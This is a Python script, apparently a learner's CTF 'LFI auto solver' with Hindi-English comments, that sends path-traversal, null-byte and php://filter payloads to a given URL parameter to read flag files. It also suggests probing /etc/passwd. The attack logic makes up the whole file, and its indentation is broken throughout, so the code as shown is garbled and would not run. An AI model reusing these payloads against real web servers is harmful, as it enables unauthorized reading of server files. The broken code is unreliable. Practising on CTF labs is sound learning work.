import requests
import base64
import sys
from urllib.parse import quote

# Colors for terminal
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
END = '\033[0m'

def print_banner():
    print(f"""{YELLOW}
╔══════════════════════════════════════╗
║ CTF LFI AUTO SOLVER ║
║ Made by UZMA - For CTF Learners ║
╚══════════════════════════════════════╝{END}
""")

def test_lfi(url, param, prefix):
    # Common flag paths - aaj wala lesson
    flag_paths = [
    "flag", "flag.txt",
    "../flag", "../flag.txt",
    "../../flag", "../../flag.txt",
    "../../../flag", "../../../flag.txt",
    "../../../../flag", "../../../../flag.txt",
    "../../../../../flag", "../../../../../flag.txt",
    "/flag.txt", "/var/www/html/flag.txt",
    "/home/flag.txt", "/root/flag.txt"
    ]

print(f"{YELLOW}[*] Testing {len(flag_paths)*2} payloads on {url}{END}")

for path in flag_paths:
    # Payload 1: Null Byte - jo aaj try kiya tune
    null_byte_payload = f"{prefix}{path}%00"
    test_url = f"{url}?{param}={null_byte_payload}"

try:
        r = requests.get(test_url, timeout=5)
        if "THM{" in r.text:
                print(f"{GREEN}[+] FLAG FOUND with Null Byte!{END}")
                print(f"{GREEN}[+] URL: {test_url}{END}")
                print(f"{GREEN}[+] FLAG: {r.text.strip()}{END}")
                return True

        # Payload 2: PHP Filter - jo aaj kaam nahi kiya par idea sahi tha
        filter_payload = f"{prefix}/php://filter/convert.base64-encode/resource={path}"
        test_url2 = f"{url}?{param}={filter_payload}"
        r2 = requests.get(test_url2, timeout=5)

if "VGhN" in r2.text or "VEhN" in r2.text:
    try:
        decoded = base64.b64decode(r2.text.strip()).decode()
if "THM{" in decoded:
            print(f"{GREEN}[+] FLAG FOUND with PHP Filter!{END}")
            print(f"{GREEN}[+] URL: {test_url2}{END}")
            print(f"{GREEN}[+] FLAG: {decoded}{END}")
            return True
            except:
            pass

            except Exception as e:
            pass

            print(f"{RED}[-] Tried: {path}{END}", end='\r')

            print(f"\n{RED}[-] Flag not found. Try increasing../ or check /etc/passwd first{END}")
            return False

if __name__ == "__main__":
            print_banner()

if len(sys.argv)!= 4:
            print(f"Usage: python solver.py <URL> <PARAM> <PREFIX>")
            print(f"Example: python solver.py http://10.49.182.104 view dog")
            sys.exit(1)

target_url = sys.argv[1]
param_name = sys.argv[2]
prefix_val = sys.argv[3]

test_lfi(target_url, param_name, prefix_val)
